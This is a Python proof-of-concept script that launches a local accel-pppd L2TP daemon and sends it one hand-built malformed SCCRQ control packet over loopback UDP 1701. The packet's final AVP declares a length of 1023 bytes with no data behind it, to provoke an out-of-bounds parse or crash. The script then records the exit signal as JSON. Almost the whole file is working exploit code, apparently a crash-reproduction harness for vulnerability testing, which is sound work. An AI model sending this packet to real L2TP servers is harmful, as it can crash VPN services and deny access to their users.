#!/usr/bin/env python3
"""PoC trigger for the accel-pppd L2TP daemon.

Starts the daemon with a generated minimal config, waits for it to bind
UDP port 1701 on loopback, delivers one dynamically constructed malformed
L2TPv2 control packet (SCCRQ carrying a truncated/oversized AVP), and
reports the outcome as a JSON object.
"""

import argparse
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time

L2TP_PORT = 1701
LOOPBACK = "127.0.0.1"
OBSERVABLE_LIMIT = 4096

CONFIG_TEMPLATE = """\
[modules]
path=lib64/accel-ppp
l2tp

[core]
log-error=stderr
thread-count=4

[ppp]
verbose=1
min-mtu=1280
mtu=1400
mru=1400
ccp=0
ipv4=require
ipv6=deny
lcp-echo-interval=20
lcp-echo-timeout=120

[l2tp]
verbose=1
"""


def build_payload():
    """Deterministically build the single L2TP trigger datagram.

    Layout (RFC 2661):
      * control header: T=1, L=1, S=1, version=2, tunnel/session id 0,
        Ns=Nr=0 -- this routes the packet into the new-tunnel (SCCRQ) path.
      * a syntactically valid SCCRQ AVP chain (Message Type, Protocol
        Version, Host Name, Framing Capabilities, Assigned Tunnel ID,
        Receive Window Size) so the parser commits to handling the message.
      * a trailing malformed AVP whose declared length (1023) vastly
        exceeds the bytes actually present (0), forcing the parser/value
        copy logic to run past the end of the datagram if the length is
        not validated, and otherwise driving teardown of a half-parsed
        control connection.
    """

    def avp(attr_type, value, mandatory=False):
        length = 6 + len(value)
        attr = length & 0x03FF
        if mandatory:
            attr |= 0x8000
        return attr.to_bytes(2, "big") + (0).to_bytes(2, "big") + \
            attr_type.to_bytes(2, "big") + value

    avps = b"".join([
        avp(0, (1).to_bytes(2, "big"), mandatory=True),   # Message Type: SCCRQ
        avp(2, b"\x01\x00"),                              # Protocol Version 1.0
        avp(7, b"poc"),                                   # Host Name
        avp(3, b"\x00\x00\x00\x03"),                      # Framing Capabilities
        avp(9, (1).to_bytes(2, "big")),                   # Assigned Tunnel ID
        avp(10, (4).to_bytes(2, "big")),                  # Receive Window Size
    ])
    # Malformed trailer: declared AVP length 1023, type Host Name, no data.
    avps += (1023 & 0x03FF).to_bytes(2, "big") + (0).to_bytes(2, "big") + \
        (7).to_bytes(2, "big")

    total_len = 12 + len(avps)
    header = bytes([0xC8, 0x02]) + total_len.to_bytes(2, "big") + \
        b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
    return header + avps


def udp_port_bound(port, timeout):
    """Poll /proc/net/udp{,6} until something listens on `port`."""
    token = ":%04X" % port
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for proc_file in ("/proc/net/udp", "/proc/net/udp6"):
            try:
                with open(proc_file, "r") as fh:
                    for line in fh.readlines()[1:]:
                        fields = line.split()
                        if len(fields) > 1 and fields[1].endswith(token):
                            return True
            except OSError:
                pass
        time.sleep(0.05)
    return False


def signal_name(returncode):
    if returncode is not None and returncode < 0:
        try:
            return signal.Signals(-returncode).name
        except ValueError:
            return "SIG%d" % (-returncode)
    return None


def run(binary, timeout):
    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "combined_output", "value": "", "path": None},
        "error": None,
    }

    binary_abs = os.path.abspath(binary)
    if not os.path.isfile(binary_abs):
        result["error"] = "binary not found: %s" % binary
        return result

    # The daemon resolves its modules relative to its parent directory
    # (<binary_dir>/../lib64/accel-ppp), so launch it from the prefix
    # directory that holds sbin/ (or the binary's dir) and lib64/.
    binary_dir = os.path.dirname(binary_abs)
    workdir = os.path.dirname(binary_dir)

    tmpdir = tempfile.mkdtemp(prefix="accel_ppp_poc_")
    conf_path = os.path.join(tmpdir, "accel-pppd.conf")
    try:
        with open(conf_path, "w") as fh:
            fh.write(CONFIG_TEMPLATE)

        command = ["accel-pppd", "--no-sigsegv", "-c", conf_path]
        result["command"] = command

        start = time.monotonic()
        try:
            proc = subprocess.Popen(
                command,
                executable=binary_abs,
                cwd=workdir,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
            )
        except OSError as exc:
            result["error"] = "failed to start daemon: %s" % exc
            return result

        payload = build_payload()
        try:
            # Wait briefly for the daemon to bind UDP 1701 (loopback).
            bind_budget = min(5.0, max(1.0, timeout * 0.5))
            while proc.poll() is None:
                if udp_port_bound(L2TP_PORT, 0.2):
                    break
                if time.monotonic() - start > bind_budget:
                    break

            # Deliver the single trigger packet.
            if proc.poll() is None:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    sock.sendto(payload, (LOOPBACK, L2TP_PORT))
                finally:
                    sock.close()

            # Wait for the daemon to exit or the timeout to elapse.
            remaining = timeout - (time.monotonic() - start)
            try:
                proc.wait(timeout=max(0.05, remaining))
            except subprocess.TimeoutExpired:
                result["timed_out"] = True
                try:
                    os.killpg(proc.pid, signal.SIGKILL)
                except (ProcessLookupError, PermissionError):
                    pass
                proc.wait()

            out, err = proc.communicate()
            result["returncode"] = proc.returncode
            result["signal"] = signal_name(proc.returncode)
            result["stdout"] = out.decode("utf-8", "replace")
            result["stderr"] = err.decode("utf-8", "replace")
        finally:
            if proc.poll() is None:
                try:
                    os.killpg(proc.pid, signal.SIGKILL)
                except (ProcessLookupError, PermissionError):
                    pass
                proc.wait()
            result["runtime_ms"] = int((time.monotonic() - start) * 1000)

        combined = result["stdout"] + result["stderr"]
        result["observable"]["value"] = combined[:OBSERVABLE_LIMIT]
    except Exception as exc:  # keep the JSON contract intact on failure
        result["error"] = "internal error: %s" % exc
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    return result


def main():
    parser = argparse.ArgumentParser(
        description="PoC trigger for accel-pppd L2TP daemon")
    parser.add_argument("--binary", required=True,
                        help="path to the accel-pppd binary")
    parser.add_argument("--json-out", default=None,
                        help="write JSON result to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="per-run timeout in seconds (default 10)")
    args = parser.parse_args()

    result = run(args.binary, args.timeout)
    blob = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(blob + "\n")
    else:
        print(blob)
    return 0


if __name__ == "__main__":
    sys.exit(main())
